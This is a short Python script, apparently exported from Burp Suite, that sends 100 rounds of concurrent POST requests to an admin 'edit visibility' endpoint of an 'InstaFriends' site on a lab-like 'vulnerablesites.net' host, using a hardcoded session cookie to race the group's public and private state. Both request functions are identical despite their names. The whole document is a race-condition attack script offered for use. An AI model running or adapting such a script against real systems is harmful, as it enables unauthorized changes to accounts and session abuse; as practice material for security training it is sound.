import requests
from multiprocessing import Process

session = requests.session()


def make_pub():
    burp0_url = "http://54-215-139-63-social.vulnerablesites.net:80/InstaFriends/admin/groups/6/edit/visibility"
    burp0_cookies = {"instafriends_session_id": "j6yxe/yfuKrtuCxcJbkycsWxG2757g43+8BukIK/LBD/rRaM"}
    session.post(burp0_url, cookies=burp0_cookies)


def make_priv():
    burp0_url = "http://54-215-139-63-social.vulnerablesites.net:80/InstaFriends/admin/groups/6/edit/visibility"
    burp0_cookies = {"instafriends_session_id": "j6yxe/yfuKrtuCxcJbkycsWxG2757g43+8BukIK/LBD/rRaM"}
    session.post(burp0_url, cookies=burp0_cookies)


for i in range(100):
    pub = Process(target=make_pub)
    priv = Process(target=make_priv)
    pub.start()
    priv.start()
    print("One iter! ")
